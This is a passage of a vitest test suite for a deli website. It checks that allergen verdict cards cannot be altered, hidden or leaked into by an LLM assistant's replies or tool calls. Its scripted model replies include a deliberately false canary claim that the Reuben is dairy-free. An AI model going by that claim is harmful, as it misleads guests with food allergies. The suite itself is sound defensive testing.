// @vitest-environment jsdom
//
// The runtime. What each block pins, and what would break it, is written above
// the block, because a test nobody can falsify is worse than no test.

import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { beforeEach, describe, expect, test, vi } from "vitest";
import type { Finding, Restriction } from "../contracts.ts";
import { MENU, RESTRICTIONS } from "../src/safety/canon.ts";
import { verdictFor } from "../src/safety/verdict.ts";
import { gate, REFUSAL_MARKER } from "../src/gate/gate.ts";
import { mountShop } from "../src/site/shop.ts";
import { boot, loadPublishedLinks, quotedTokensOnly, reconcileActions, renderableDetail, type BootOptions, type Runtime } from "../src/runtime/boot.ts";
import { actionDefinitions, checkSafety, registerSiteActions, type SiteContext } from "../src/runtime/actions.ts";
import { KeyStore, KEY_ITEM, type StorageLike } from "../src/runtime/key-store.ts";
import { Router, SCRIPTED_ROUTER, SCRIPTS, scriptById } from "../src/runtime/llm.ts";
import { Conversation, describeReceipts } from "../src/runtime/loop.ts";
import { cardKind, cardLines, cardReason, renderVerdicts } from "../src/runtime/verdict-cards.ts";
import { Transcript, claimedLabel, refusalLine } from "../src/runtime/transcript.ts";
import type { ConfirmItem, Manifest, NetworkConfig, TraceEntry } from "../src/runtime/types.ts";
import { ActionRegistry } from "../src/runtime/upstream/action-registry.ts";
import { classify_tool, find_front_man } from "../src/runtime/upstream/graph.ts";
import { validate_agent_names, validate_missing_nodes, validate_network, validate_shape } from "../src/runtime/upstream/validation.ts";
import { filter_sly_data } from "../src/runtime/upstream/sly-data.ts";
import { joinSiteText, joinTokens, ours, siteText, tokenOrOmitted } from "../src/runtime/errors.ts";
import { selectTopRouter, manifestAllowsPeer } from "../src/runtime/upstream/router.ts";

/* ================================================================== */
/* Harness                                                             */
/* ================================================================== */

const root = resolve(import.meta.dirname, "..");
const html = readFileSync(resolve(root, "src/site/index.html"), "utf8");
const readPublic = (f: string): unknown => JSON.parse(readFileSync(resolve(root, "public", f), "utf8"));
const MANIFEST = readPublic("agent-manifest.json") as Manifest;
const NETWORK = readPublic("vouch.network.json") as NetworkConfig;
const LINKS = readPublic("links.json");

const BASE = "https://deli.example";
const ROUTER = "https://api.openai.com/v1";
const ROUTER_URL = `${ROUTER}/chat/completions`;

/** Obviously fake. Never a real key, in a test, a fixture or a log line. */
const SENTINEL = "sk-FAKE-SENTINEL-vouch-task6-DO-NOT-USE";

/**
 * One intercepted request. Deliberately carries NO `bodyText`.
 *
 * It used to, filled with `await request.clone().text()` BEFORE the push. That put
 * `captured.push` behind an await, so a fire-and-forget beacon — which is what an
 * exfiltration beacon is — landed in `captured` only after the test's assertions had
 * already run, and was never scanned. Reading a Blob body takes more microtasks than
 * reading a URLSearchParams one, so the string and URLSearchParams beacons were
 * caught and the Blob beacon was not. A race, not a blind spot, which is why the
 * liveness test could not see it: it built its captures synchronously.
 *
 * The capture is now synchronous and bodies are read at SCAN time, inside `leaks`.
 */
interface Captured {
  url: string;
  init: RequestInit;
  request: Request;
}

type ModelJson = Record<string, unknown>;

/** An OpenAI-shaped reply with plain text. */
const say = (content: string): ModelJson => ({ model: "test-model", choices: [{ message: { content } }] });

/** An OpenAI-shaped reply proposing one call. */
const callTool = (name: string, args: unknown = {}, id = `call_${name}`): ModelJson => ({
  model: "test-model",
  choices: [{ message: { content: "", tool_calls: [{ id, type: "function", function: { name, arguments: JSON.stringify(args) } }] } }],
});

const ok = (body: unknown): Response =>
  ({ ok: true, status: 200, json: async () => body, text: async () => JSON.stringify(body) }) as unknown as Response;
const missing = (): Response =>
  ({ ok: false, status: 404, json: async () => ({}), text: async () => "not found" }) as unknown as Response;

interface Harness {
  captured: Captured[];
  fetchImpl: typeof fetch;
  routerBodies: () => Promise<{ messages: { role: string; content: string; name?: string }[]; tools?: { function: { name: string } }[] }[]>;
}

/**
 * A fetch that serves the REAL published artifacts from public/, plus a queue of
 * model replies, and records every request as a platform `Request` so assertions
 * are made on the normalised request rather than on the options we passed.
 */
function harness(opts: { replies?: ModelJson[]; artifacts?: Record<string, unknown>; peers?: Record<string, unknown>; artifactError?: boolean } = {}): Harness {
  const captured: Captured[] = [];
  const replies = [...(opts.replies ?? [])];
  const artifacts: Record<string, unknown> = {
    [`${BASE}/agent-manifest.json`]: MANIFEST,
    [`${BASE}/vouch.network.json`]: NETWORK,
    [`${BASE}/links.json`]: LINKS,
    ...opts.artifacts,
  };
  const fetchImpl = (async (input: RequestInfo | URL, init: RequestInit = {}) => {
    const url = String(input);
    const request = captureRequest(url, init);
    // SYNCHRONOUS, before any await: a request that is never awaited by its caller
    // is in `captured` the instant it is made. Bodies are read at SCAN time, in
    // `leaks`, so neither body KIND nor capture TIME can hide one.
    captured.push({ url, init, request });
    if (opts.artifactError && url.startsWith(BASE)) throw new TypeError("Failed to fetch");
    if (url === ROUTER_URL) {
      const next = replies.shift();
      if (!next) throw new Error("the test ran out of scripted model replies");
      return ok(next);
    }
    if (Object.hasOwn(artifacts, url)) return ok(artifacts[url]);
    if (opts.peers && Object.hasOwn(opts.peers, url)) return ok(opts.peers[url]);
    return missing();
  }) as unknown as typeof fetch;
  return {
    captured,
    fetchImpl,
    routerBodies: async () =>
      Promise.all(captured.filter((c) => c.url === ROUTER_URL).map(async (c) => JSON.parse(await bodyOf(c)))),
  };
}

/**
 * Build the normalised Request for a capture, and NEVER lose a capture because
 * building one failed. A stream body needs `duplex: "half"`, and an init that
 * omits it makes `new Request` throw — which would have dropped the whole
 * interception on the floor and made the beacon invisible for a third reason.
 */
function captureRequest(url: string, init: RequestInit): Request {
  try {
    return new Request(url, init.body ? { ...init, duplex: "half" } as RequestInit : init);
  } catch {
    const { body: _body, ...rest } = init;
    try {
      return new Request(url, rest);
    } catch {
      return new Request(url);
    }
  }
}

/**
 * The body of an intercepted request, whatever shape it was given in, read at
 * SCAN time. Falls back to reading `init.body` directly if the Request could not
 * carry it, so no body shape can hide by making Request construction fail.
 */
async function bodyOf(c: Captured): Promise<string> {
  const fromRequest = await c.request.clone().text().catch(() => "");
  if (fromRequest) return fromRequest;
  return readBodyInit(c.init.body);
}

async function readBodyInit(body: BodyInit | null | undefined): Promise<string> {
  if (body === null || body === undefined) return "";
  if (typeof body === "string") return body;
  if (body instanceof URLSearchParams) return body.toString();
  if (typeof FormData !== "undefined" && body instanceof FormData) {
    return [...body.entries()].map(([k, v]) => `${k}=${String(v)}`).join("&");
  }
  if (typeof Blob !== "undefined" && body instanceof Blob) return body.text().catch(() => "");
  if (typeof ReadableStream !== "undefined" && body instanceof ReadableStream) {
    return new Response(body as BodyInit).text().catch(() => "");
  }
  try {
    return new TextDecoder().decode(body as ArrayBuffer);
  } catch {
    return "";
  }
}

class MemStorage implements StorageLike {
  readonly map = new Map<string, string>();
  getItem(k: string): string | null {
    return this.map.get(k) ?? null;
  }
  setItem(k: string, v: string): void {
    this.map.set(k, v);
  }
  removeItem(k: string): void {
    this.map.delete(k);
  }
}

interface Session {
  runtime: Runtime;
  mount: HTMLElement;
  plans: ConfirmItem[][];
  storage: MemStorage;
  h: Harness;
  answer: { value: boolean };
  panelText: () => string;
  transcriptText: () => string;
  $: (sel: string) => HTMLElement | null;
  $$: (sel: string) => HTMLElement[];
  tick: (id: string) => void;
  setReplay: (scriptId: string) => void;
}

async function session(opts: Partial<BootOptions> & { h?: Harness; key?: string } = {}): Promise<Session> {
  const h = opts.h ?? harness();
  const storage = new MemStorage();
  if (opts.key) storage.setItem(KEY_ITEM, JSON.stringify({ key: opts.key }));
  const plans: ConfirmItem[][] = [];
  const answer = { value: true };
  const mount = document.createElement("div");
  document.body.append(mount);
  const { h: _ignored, key: _ignored2, ...rest } = opts;
  const runtime = await boot(mount, {
    base: BASE,
    fetchImpl: h.fetchImpl,
    storage,
    confirm: (plan) => {
      plans.push(plan);
      return answer.value;
    },
    ...rest,
  });
  const $ = (sel: string): HTMLElement | null => mount.querySelector<HTMLElement>(sel);
  const $$ = (sel: string): HTMLElement[] => [...mount.querySelectorAll<HTMLElement>(sel)];
  return {
    runtime,
    mount,
    plans,
    storage,
    h,
    answer,
    panelText: () => mount.textContent ?? "",
    transcriptText: () => $("[data-transcript]")?.textContent ?? "",
    $,
    $$,
    tick: (id: string) => {
      const box = mount.querySelector<HTMLInputElement>(`[data-restriction="${id}"]`)!;
      box.checked = true;
      box.dispatchEvent(new Event("change"));
    },
    setReplay: (scriptId: string) => {
      const select = mount.querySelector<HTMLSelectElement>("[data-script]")!;
      select.value = scriptId;
      const box = mount.querySelector<HTMLInputElement>("[data-replay]")!;
      box.checked = true;
      box.dispatchEvent(new Event("change"));
    },
  };
}

const slot = (id: string): HTMLElement => document.querySelector<HTMLElement>(`[data-verdict-slot="${id}"]`)!;
const card = (id: string): HTMLElement | null => document.querySelector<HTMLElement>(`[data-verdict-item="${id}"]`);
const DAIRY = RESTRICTIONS.find((r) => r.id === "dairy_free")!;

/**
 * THE SLOTS LIVE IN THE PAGE, NOT IN THE PANEL.
 *
 * The first version of this suite scoped every "this prose must not appear"
 * assertion to the transcript element or to `mount.textContent`. The verdict slots
 * are in `document`, outside the mount, so a mutant that wrote the model's raw
 * ungated reply into all 34 cards passed the whole suite. These three helpers exist
 * so that no assertion in this file can make that mistake again: `pageText()` is
 * the widest surface there is, and `slotsText()` is the one that was missed.
 */
/**
 * Attributes that put text in front of a person. `aria-label` is the sharp one: it
 * does not add to an element's accessible name, it REPLACES it — so a card whose
 * `textContent` is byte-identical to the checker's can still read the model's
 * ungated safety claim to a screen-reader user. A blind guest hearing the model's
 * claim while a sighted guest reads the checker's verdict is the worst possible
 * split, and it is exactly the population a safety feature exists for.
 */
const TEXT_ATTRS = [
  "aria-label", "aria-labelledby", "aria-description", "aria-describedby", "aria-roledescription",
  "aria-valuetext", "aria-placeholder", "title", "alt", "placeholder", "value", "label", "content",
];

/** Everything on an element and its subtree that a person or assistive tech can read. */
function readableText(root: Element | Document | DocumentFragment): string {
  const parts: string[] = [root.textContent ?? ""];
  const all = root instanceof Element ? [root, ...root.querySelectorAll("*")] : [...root.querySelectorAll("*")];
  for (const el of all) {
    for (const a of TEXT_ATTRS) {
      const v = el.getAttribute(a);
      if (v) parts.push(v);
    }
    if (el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement) parts.push(el.value);
  }
  return parts.join(" ");
}

/**
 * The whole page as a guest can receive it: body text, every text-bearing
 * attribute, every form-control value, and `<head>`'s title. `textContent` alone
 * saw none of the last three, and mutants writing the model's reply into
 * `aria-label`, `title`, `document.title`, `value` and `placeholder` all passed.
 */
const pageText = (): string => `${readableText(document.body)} ${document.title}`;
const slotsText = (): string[] => [...document.querySelectorAll<HTMLElement>("[data-verdict-slot]")].map((s) => s.textContent ?? "");
const slotTextOf = (id: string): string => slot(id).textContent ?? "";
/** A slot as a guest can RECEIVE it, attributes included. */
const slotReadable = (id: string): string => readableText(slot(id));

/**
 * Is this element actually presented to a guest? The invariant says a card's
 * PRESENCE may not be changed by anything reachable from the model, and four
 * mutants hid every card — `display:none`, `hidden`, `aria-hidden` — while every
 * existence-and-text assertion passed. This is the I3 lesson ("assert visible, not
 * merely in the DOM") applied to the thing the task is actually about.
 *
 * jsdom has no layout, so this checks the mechanisms that do not need one:
 * the `hidden` attribute, `aria-hidden`, and inline `display`/`visibility`, on the
 * element and on every ancestor.
 */
function hiddenReason(el: Element | null): string | null {
  for (let node: Element | null = el; node && node !== document.documentElement; node = node.parentElement) {
    if (node.hasAttribute("hidden")) return `hidden on <${node.tagName.toLowerCase()}>`;
    if (node.getAttribute("aria-hidden") === "true") return `aria-hidden on <${node.tagName.toLowerCase()}>`;
    const style = (node as HTMLElement).style;
    if (style?.display === "none") return `display:none on <${node.tagName.toLowerCase()}>`;
    if (style?.visibility === "hidden" || style?.visibility === "collapse") return `visibility on <${node.tagName.toLowerCase()}>`;
    if (style?.opacity === "0") return `opacity:0 on <${node.tagName.toLowerCase()}>`;
  }
  return el ? null : "no element";
}

/**
 * What a card for `item` under `selected` must say, derived INDEPENDENTLY of the
 * renderer from the pure functions: `verdictFor` from the safety layer and
 * `cardLines` from the card module. Neither can see a model.
 *
 * An exact equality against this is the assertion that catches text reaching a
 * card from anywhere else — a mutant appending the model's reply to the reason
 * line, or replacing the headline, changes the string and fails.
 */
const expectedCardText = (itemId: string, selected: Restriction[]): string =>
  cardLines(verdictFor(MENU.items.find((i) => i.id === itemId)!, selected, MENU), MENU, RESTRICTIONS).join("");

beforeEach(() => {
  document.documentElement.innerHTML = html;
  mountShop(document);
});

/* ================================================================== */
/* A. Verdict cards render independently of gated prose                */
/* ================================================================== */

describe("the verdict is displayed beside the dish, not through the chat", () => {
  /**
   * The requirement that outranks the rest of this task. Breaks if the renderer
   * is ever made to depend on a model reply, a router, a key or a successful
   * network load: here EVERY artifact fetch throws, so there is no manifest, no
   * network, no router and no assistant at all.
   */
  test("every card renders with no manifest, no network, no router, no key and no model", async () => {
    const s = await session({ h: harness({ artifactError: true }) });
    expect(s.runtime.router).toBeNull();
    expect(s.runtime.conversation).toBeNull();
    expect(s.$("[data-runtime-error]")!.hasAttribute("hidden")).toBe(false);

    s.tick("dairy_free");
    expect(s.$$("[data-verdict-slot] [data-verdict]")).toHaveLength(0); // slots are in the page, not the panel
    expect(document.querySelectorAll("[data-verdict-slot] [data-verdict]")).toHaveLength(MENU.items.length);
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
    // And the page says so plainly, because a visitor should know why the chat is dead.
    expect(s.$("[data-runtime-error]")!.textContent).toContain("never call a model");
  });

  test("a card goes in its own item's slot, and in no other", async () => {
    const s = await session();
    s.tick("dairy_free");
    for (const item of MENU.items) {
      const inSlot = slot(item.id).querySelector("[data-verdict-item]");
      expect(inSlot?.getAttribute("data-verdict-item"), item.id).toBe(item.id);
    }
  });

  test("an unsafe card names the verdict and the ingredient that decided it", async () => {
    const s = await session();
    s.tick("dairy_free");
    const c = card("turkey_club")!;
    expect(c.getAttribute("data-verdict")).toBe("unsafe");
    expect(c.textContent).toContain("Unsafe");
    // Dairy in the turkey club is derived only: brioche -> butter -> dairy.
    expect(c.textContent!.toLowerCase()).toContain("dairy");
    expect(c.textContent!.toLowerCase()).toContain("butter");
    expect(c.textContent).toContain("→"); // the derivation path, not just a word
  });

  test("an unknown card says we do not know, and does not read as either a hazard or an all-clear", async () => {
    const s = await session();
    s.tick("dairy_free");
    const c = card("daily_special")!;
    expect(c.getAttribute("data-verdict")).toBe("unknown");
    expect(c.textContent).toContain("We don't know");
    expect(c.textContent).not.toContain("Unsafe");
    expect(c.textContent).not.toContain("No conflict");
    expect(c.textContent!.toLowerCase()).toContain("no ingredient list");
  });

  /**
   * A `safe` Finding with `covered: []` asserts nothing. Breaks the moment that
   * case is rendered with the reassuring wording: `cardKind` would return "safe"
   * and the headline would read "No conflict found".
   */
  test("a safe finding that checked nothing is rendered as not checked, never as reassurance", () => {
    const nothing: Finding = { item: "reuben", verdict: "safe", covered: [] };
    expect(cardKind(nothing)).toBe("unchecked");
    const text = cardReason(nothing, MENU);
    expect(text).toContain("Nothing was checked");
    expect(text).toContain("not an all-clear");
    expect(cardLines(nothing, MENU, RESTRICTIONS).join(" ")).not.toContain("No conflict found");
    // And the renderer never produces that Finding in the first place: an empty
    // selection clears every slot rather than painting 34 "not checked" cards.
    expect(renderVerdicts(document, [], MENU, RESTRICTIONS)).toEqual([]);
    expect(document.querySelectorAll("[data-verdict-slot] [data-verdict]")).toHaveLength(0);
  });

  test("with nothing selected, no card is shown at all and the page says why", async () => {
    const s = await session();
    expect(document.querySelectorAll("[data-verdict-slot] [data-verdict]")).toHaveLength(0);
    expect(s.$("[data-verdict-status]")!.textContent).toContain("Nothing is being checked yet");
    expect(s.$("[data-verdict-status]")!.textContent).toContain("no key");
  });

  test("a card survives the site being mounted again (node identity, not markup)", async () => {
    const s = await session();
    s.tick("dairy_free");
    const before = card("reuben")!;
    mountShop(document);
    expect(card("reuben")).toBe(before);
  });
});

/* ================================================================== */
/* A1. THE INVARIANT: cards are a pure function of menu x selection     */
/* ================================================================== */

describe("nothing reachable from the model can change what a card shows", () => {
  /**
   * THE MOST IMPORTANT TEST IN THIS PROJECT.
   *
   * Invariant: the verdict cards are a pure function of (the menu, the guest's
   * restriction set). Not their verdict, not their text, not their presence, not
   * their order may be changed by anything reachable from the model.
   *
   * The model here behaves CORRECTLY: it asks `check_safety` with a different
   * restriction (the normal path when a guest who ticked Dairy-free types "is the
   * turkey club nut-free?"), with no restriction at all, and for one item only.
   * It also reads the menu and adds to the cart. Every slot's full text and the
   * status line must come out byte-identical.
   *
   * WHAT BREAKS IT: putting a display callback back on `SiteContext` and calling
   * it from `checkSafety`; giving `renderVerdicts` a `Finding[]` parameter again
   * and passing it a model-requested result; calling `check()` from anywhere other
   * than the checkbox handler. Each of those is the shipped bug this replaces.
   */
  test("a sequence of model tool calls leaves every card and the status line byte-identical", async () => {
    const h = harness({
      replies: [
        callTool("check_safety", { restrictions: [] }, "c1"),
        callTool("check_safety", { items: ["turkey_club"], restrictions: ["nut_free"] }, "c2"),
        callTool("check_safety", { items: ["reuben"] }, "c3"),
        callTool("get_menu_state", {}, "c4"),
        callTool("add_to_cart", { item: "lemonade" }, "c5"),
        say("I have had a look."),
      ],
      
    });
    const s = await session({ key: SENTINEL, h, limits: { maxRounds: 8 } });
    s.tick("dairy_free");

    const before = slotsText();
    const readableBefore = MENU.items.map((i) => readableText(slot(i.id)));
    const statusBefore = s.$("[data-verdict-status]")!.textContent;
    expect(before.filter((x) => x.includes("Unsafe")).length).toBe(15);

    await s.runtime.ask("is the turkey club nut-free?");

    expect(slotsText()).toEqual(before);
    expect(readableBefore).toEqual(MENU.items.map((i) => readableText(slot(i.id))));
    expect(s.$("[data-verdict-status]")!.textContent).toBe(statusBefore);
    expect(s.$("[data-verdict-status]")!.textContent).toContain("15 unsafe");
    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
    // Presence, not just text: no card may have been hidden by the turn.
    for (const item of MENU.items) expect(hiddenReason(card(item.id)), item.id).toBeNull();
    // The model really did get its answers: the calls happened, they just did not display.
    // Each round resends the whole message list, so count distinct results.
    const toolResults = [...new Set((await h.routerBodies()).flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content)))];
    expect(toolResults.filter((c) => c.includes("succeeded"))).toHaveLength(5);
    expect(toolResults.some((c) => c.includes('"verdict":"safe"') && c.includes("nut"))).toBe(true);
  });

  /**
   * Every card's text is EXACTLY what the pure functions produce for the guest's
   * selection, across every fixture, including the one whose reply is a false
   * all-clear. Breaks if any model-derived string is added to, or substituted
   * into, any part of a card.
   */
  test.each(SCRIPTS.map((s) => s.id))("after replaying '%s', every card's text is exactly the checker's", async (scriptId) => {
    document.documentElement.innerHTML = html;
    mountShop(document);
    const s = await session();
    s.tick("dairy_free");
    s.setReplay(scriptId);
    await s.runtime.ask("I'm lactose intolerant, what can I eat?");

    const raw = scriptById(scriptId)!.turns.map((x) => x.content ?? "").join(" ");
    for (const item of MENU.items) {
      // 1. The text is exactly the checker's.
      expect(slotTextOf(item.id), item.id).toBe(expectedCardText(item.id, [DAIRY]));
      // 2. The card is actually presented, not merely in the DOM. A model that can
      //    hide every card blanks the safety channel as surely as one that can
      //    overwrite it, and the invariant says PRESENCE.
      expect(hiddenReason(card(item.id)), `${item.id} is hidden`).toBeNull();
      // 3. Nothing a person or assistive technology reads carries model text —
      //    aria-label REPLACES a card's accessible name, so byte-equality of
      //    textContent would not notice.
      expect(slotReadable(item.id), item.id).toBe(expectedCardText(item.id, [DAIRY]));
      for (const phrase of phrasesOf(raw)) {
        expect(slotReadable(item.id), `${item.id} / ${phrase}`).not.toContain(phrase);
      }
    }
    // 4. And nothing of the model's words anywhere else a guest can receive text,
    //    including <head> and form-control values.
    for (const phrase of phrasesOf(raw)) {
      expect(slotsText().join(" "), phrase).not.toContain(phrase);
      expect(document.title, phrase).not.toContain(phrase);
    }
  });

  /**
   * PRESENCE, stated on its own, because four separate mutants hid every card and
   * all four passed: `style.display = "none"`, the `hidden` attribute, and
   * `aria-hidden="true"`, each alone and in combination.
   *
   * A model that can hide every card can blank the safety channel just as
   * effectively as one that can overwrite it. Breaks if any of those is applied to
   * a card, its slot, or anything between a card and the document.
   */
  test("every card is presented to the guest, not merely present in the DOM", async () => {
    const h = harness({ replies: [callTool("check_safety", { restrictions: [] }), say("Looked.")] });
    const s = await session({ key: SENTINEL, h });
    s.tick("dairy_free");
    await s.runtime.ask("have a look");
    for (const item of MENU.items) {
      const c = card(item.id);
      expect(c, item.id).not.toBeNull();
      expect(hiddenReason(c), item.id).toBeNull();
      expect(hiddenReason(slot(item.id)), `${item.id} slot`).toBeNull();
    }
  });

  /** The detector has to be able to fail, or the assertion above proves nothing. */
  test("the visibility check is live: each way of hiding a card is reported", async () => {
    const s = await session();
    s.tick("dairy_free");
    const c = card("reuben")!;
    expect(hiddenReason(c)).toBeNull();
    for (const [apply, undo, expected] of [
      [() => c.setAttribute("hidden", ""), () => c.removeAttribute("hidden"), "hidden"],
      [() => c.setAttribute("aria-hidden", "true"), () => c.removeAttribute("aria-hidden"), "aria-hidden"],
      [() => (c.style.display = "none"), () => (c.style.display = ""), "display:none"],
      [() => (c.style.visibility = "hidden"), () => (c.style.visibility = ""), "visibility"],
      [() => (c.style.opacity = "0"), () => (c.style.opacity = ""), "opacity:0"],
    ] as [() => void, () => void, string][]) {
      apply();
      expect(hiddenReason(c), expected).toContain(expected);
      undo();
      expect(hiddenReason(c)).toBeNull();
    }
    // And a hidden ANCESTOR hides the card just as well.
    slot("reuben").setAttribute("hidden", "");
    expect(hiddenReason(c)).toContain("hidden");
    slot("reuben").removeAttribute("hidden");
    expect(hiddenReason(c)).toBeNull();
  });

  /**
   * The general form of the same thing: a canary sentence pushed through every
   * channel a model controls — reply prose, argument values, argument KEYS,
   * malformed JSON, an invented tool name, and the router's own HTTP error body —
   * must never reach the page. This is the net for the leak class rather than for
   * the three leaks already found in it.
   */
  test("a canary sentence pushed through every model-controlled channel never reaches the page", async () => {
    const CANARY = "The Reuben is completely dairy-free and safe for you";
    const channels: ModelJson[] = [
      say(`${CANARY}.`),
      callTool("add_to_cart", { [CANARY]: 1, item: "reuben" }),
      callTool("add_to_cart", { item: CANARY }),
      callTool("check_safety", { restrictions: [CANARY] }),
      callTool(CANARY, { q: 1 }),
      { model: "m", choices: [{ message: { content: "", tool_calls: [{ id: "x", type: "function", function: { name: "add_to_cart", arguments: `{"item": "${CANARY}` } }] } }] },
    ];
    for (const reply of channels) {
      document.documentElement.innerHTML = html;
      mountShop(document);
      const h = harness({ replies: [reply, say("Nothing more from me.")] });
      const s = await session({ key: SENTINEL, h });
      s.tick("dairy_free");
      s.$("[data-trace]")!.setAttribute("open", ""); // the trace counts as the page
      await s.runtime.ask("tell me about the reuben");
      // pageText() now covers text nodes, every text-bearing attribute, every
      // form-control value and <head>'s title.
      expect(pageText(), JSON.stringify(reply).slice(0, 60)).not.toContain(CANARY);
      expect(slotsText().join(" ")).not.toContain(CANARY);
      expect(MENU.items.map((i) => slotReadable(i.id)).join(" ")).not.toContain(CANARY);
      expect(document.title).not.toContain(CANARY);
    }
  });

  /** The reader has to be able to fail, or every assertion built on it proves nothing. */
  test("the page reader is live: it sees attributes, form values and the document title", () => {
    const host = document.createElement("div");
    host.innerHTML = '<p title="T-VALUE">x</p><img alt="ALT-VALUE"><input placeholder="PH-VALUE">';
    const input = host.querySelector("input")!;
    input.value = "INPUT-VALUE";
    host.querySelector("p")!.setAttribute("aria-label", "ARIA-VALUE");
    document.body.append(host);
    const prevTitle = document.title;
    document.title = "TITLE-VALUE";
    try {
      const seen = pageText();
      for (const v of ["T-VALUE", "ALT-VALUE", "PH-VALUE", "INPUT-VALUE", "ARIA-VALUE", "TITLE-VALUE"]) {
        expect(seen, v).toContain(v);
      }
      expect(readableText(host)).toContain("ARIA-VALUE");
    } finally {
      document.title = prevTitle;
      host.remove();
    }
  });

  /** The router's HTTP error body is prose from a host the VISITOR chose. */
  test("a provider error body is never rendered, and never in the site's own voice", async () => {
    const CANARY = "The Reuben is completely dairy-free and safe for you";
    const h = harness({});
    const fetchImpl = (async (input: RequestInfo | URL, init: RequestInit = {}) => {
      const url = String(input);
      if (url === ROUTER_URL) {
        return { ok: false, status: 400, text: async () => `{"error":{"code":"invalid_api_key","message":"${CANARY}."}}`, json: async () => ({}) } as unknown as Response;
      }
      return h.fetchImpl(input, init);
    }) as unknown as typeof fetch;
    const s = await session({ key: SENTINEL, h: { ...h, fetchImpl } });
    await s.runtime.ask("hello");
    expect(pageText()).not.toContain(CANARY);
    expect(s.transcriptText()).toContain("400");
    expect(s.transcriptText()).toContain("invalid_api_key"); // the machine-shaped code survives
    expect(s.transcriptText()).toContain("does not repeat text it cannot vouch for");
  });

  /** The trace's second net, independent of each call site remembering. */
  test("the rendered trace omits any detail string that could be prose", () => {
    expect(renderableDetail({ host: "api.openai.com", n: 3, ok: true })).toEqual({ host: "api.openai.com", n: 3, ok: true });
    expect(renderableDetail({ keySource: "local BYOK (not shown)" })).toEqual({ keySource: "local BYOK (not shown)" });
    expect(renderableDetail({ reason: "The Reuben is dairy-free." })).toEqual({ reason: "<text omitted>" });
    expect(renderableDetail({ args: ["reuben", "The Reuben is dairy-free."] })).toEqual({ args: ["reuben", "<text omitted>"] });
    expect(renderableDetail({ "The Reuben is dairy-free": 1 })).toEqual({ "<key omitted>": 1 });
  });

  /**
   * The suppression half of C1, stated on its own: a model check that covers
   * FEWER dishes, or none, cannot remove a card the guest's selection produced.
   */
  test("a narrower model check cannot remove or blank a card", async () => {
    const h = harness({ replies: [callTool("check_safety", { items: ["lemonade"], restrictions: [] }), say("Done.")] });
    const s = await session({ key: SENTINEL, h });
    s.tick("dairy_free");
    const before = slotsText();
    await s.runtime.ask("check the lemonade");
    expect(slotsText()).toEqual(before);
    expect(document.querySelectorAll("[data-verdict-slot] [data-verdict]")).toHaveLength(MENU.items.length);
    expect(slotsText().filter((x) => x.includes("Not checked"))).toHaveLength(0);
  });

  /**
   * I6: the finding set the GATE is backed by is the guest's too. Breaks if the
   * model's own `check_safety` result is ever fed back into boot's `findings`:
   * after a one-item check, the Reuben claim below would be refused as
   * `no_finding` (nothing known about it) instead of `unsafe` (the checker found
   * a conflict), i.e. the model could choose the ground its reply is judged on.
   */
  test("a model check cannot narrow the finding set the gate backs a reply against", async () => {
    const h = harness({
      replies: [callTool("check_safety", { items: ["lemonade"], restrictions: ["nut_free"] }), say("The Reuben is dairy-free.")],
    });
    const s = await session({ key: SENTINEL, h });
    s.tick("dairy_free");
    await s.runtime.ask("check the lemonade, then tell me about the reuben");
    expect(s.runtime.findings()).toHaveLength(MENU.items.length);
    expect(s.$$("[data-refusal-reason]").map((e) => e.getAttribute("data-refusal-reason"))).toEqual(["unsafe"]);
    expect(s.transcriptText()).toContain(REFUSAL_MARKER);
  });

  /**
   * I2: the trace is both a page surface and a data surface. Two independent
   * defences, pinned separately: the call sites record no model-chosen string
   * (asserted here, on `runtime.trace()`, the data), and the renderer refuses to
   * print one anyway (asserted above, on `renderableDetail`). Either alone would
   * leave a hole; breaking either fails a test.
   */
  test("no model-chosen string reaches the recorded trace, keys included", async () => {
    const CANARY = "The Reuben is completely dairy-free and safe for you";
    const h = harness({ replies: [callTool("add_to_cart", { [CANARY]: 1, item: CANARY }), say("I could not.")] });
    const s = await session({ key: SENTINEL, h });
    await s.runtime.ask("add one");
    expect(JSON.stringify(s.runtime.trace())).not.toContain(CANARY);
    const proposed = s.runtime.trace().find((e) => e.event === "action_proposed")!;
    expect(proposed.detail["argumentKeys"]).toEqual(["item"]); // declared by the schema, so safe to show
    expect(proposed.detail["undeclaredKeyCount"]).toBe(1); // the sentence is counted, not named
    const refused = s.runtime.trace().find((e) => e.event === "action_refused")!;
    expect(refused.detail["kind"]).toBe("invalid_arguments");
    expect(refused.detail["reason"]).toBeUndefined();
  });

  /**
   * ...and the renderer really is wired to the sanitiser, through a real path.
   *
   * A refused peer target is traced with the URL it was asked for, and a caller can
   * ask for anything. So the DATA keeps the whole string (it is evidence, and
   * `leaks()` scans it) while the RENDERED trace omits it. Breaks if `addTrace`
   * stops rendering through `renderableDetail` — which no other test catches,
   * because the call sites no longer produce prose for it to catch.
   */
  test("the rendered trace omits prose that the recorded trace keeps", async () => {
    const PROSE = "the reuben is dairy-free and safe";
    const s = await session();
    await expect(s.runtime.fetchPeerArtifact(PROSE)).rejects.toThrow();
    expect(JSON.stringify(s.runtime.trace())).toContain(PROSE);
    expect(s.$("[data-trace-list]")!.textContent).not.toContain(PROSE);
    expect(s.$("[data-trace-list]")!.textContent).toContain("<text omitted>");
    expect(pageText()).not.toContain(PROSE);
  });

  /**
   * THE SWEEP, not the three patches.
   *
   * Every site in `src/runtime` that writes a string into the DOM was enumerated
   * and classified. The ones that can carry a string we did not write are pinned
   * here. The rule they all now follow: the transcript speaks in the deli's voice,
   * so only an error THIS runtime wrote (a `RuntimeMessage`) may be shown; anything
   * else is reported in our own words with its kind in the trace.
   */
  test("an error this runtime did not write is never shown in the site's voice", async () => {
    const CANARY = "The Reuben is completely dairy-free and safe for you";
    const h = harness({});
    // A router that answers 200 with prose where JSON should be: `resp.json()`
    // throws, and the thrown message is not one of ours.
    const fetchImpl = (async (input: RequestInfo | URL, init: RequestInit = {}) => {
      const url = String(input);
      if (url === ROUTER_URL) {
        return {
          ok: true,
          status: 200,
          json: async () => {
            throw new Error(CANARY);
          },
          text: async () => CANARY,
        } as unknown as Response;
      }
      return h.fetchImpl(input, init);
    }) as unknown as typeof fetch;
    const s = await session({ key: SENTINEL, h: { ...h, fetchImpl } });
    await s.runtime.ask("hello");
    expect(pageText()).not.toContain(CANARY);
